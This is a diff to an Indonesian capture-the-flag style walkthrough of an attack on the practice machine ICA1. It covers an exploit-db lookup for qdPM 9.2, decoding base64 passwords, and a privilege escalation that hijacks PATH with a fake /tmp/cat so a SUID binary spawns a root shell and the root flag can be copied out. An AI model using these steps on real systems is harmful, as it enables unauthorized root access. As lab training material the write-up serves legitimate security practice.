@@ -23,6 +23,7 @@ Ini adalah hasil serangan yang telah dilakukan pada server ICA1 untuk latihan se
 ```
 searchsploit qdPM 9.2
 ```
+- jika tidak tersedia maka browse di google (loncat ke terapkan exploit)
 - access exploit
 ```
 cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
@@ -63,7 +64,7 @@ while read anangLine; do echo "$anangLine" | base64 --decode; echo ""; done < pa
 - buat file `pass.txt` yang berisi hasil output decode
 - ubah username menjadi lower
 ```
-while read anangLine; do echo "$anangLine" | tr '[:upper:]' '[:lower:]'; echo ""; done < username.txt
+while read anangLine; do echo "$anangLine" | tr '[:upper:]' '[:lower:]'; done < username.txt
 ```
 - ubah file `username.txt` dengan hasil output
 
@@ -92,6 +93,7 @@ cat note.txt
 
 
 ## Privilege Escalation
+- gunakan user **dexter**
 - cari yang berhubungan dengan root
 ```
 find / -perm -u=s 2>/dev/null
@@ -105,7 +107,7 @@ find / -perm -u=s 2>/dev/null
 echo $PATH
 ```
 ```
-echo '/bin/bash' >> /tmp/myroot
+echo '/bin/bash' >> /tmp/cat
 ```
 ```
 export PATH=/tmp:$PATH
@@ -117,13 +119,33 @@ echo $PATH
 
 - ubah mode **myroot**
 ```
-chmod +x /tmp/myroot
+chmod +x /tmp/cat
 ```
 - jalankan get_access lagi
 ```
 /opt/get_access
 ```
-- temukan **flag root**
+- temukan flag
 ```
 cat /root/root.txt
 ```
+- jika perintah cat tidak bekerja
+- copy flag pada home
+```
+scp /root/root.txt /home/dexter
+```
+- ubah mode
+```
+chmod 777 /home/dexter/root.txt
+```
+- lakukan exit beberapa kali (sampai logout ssh)
+```
+exit
+```
+- konesikan ulang ssh
+- dan lihat **flag root**
+```
+cat root.txt
+```
+
+**note :** jika mau akses root maka ulangi langkah `Privilege Escalation`
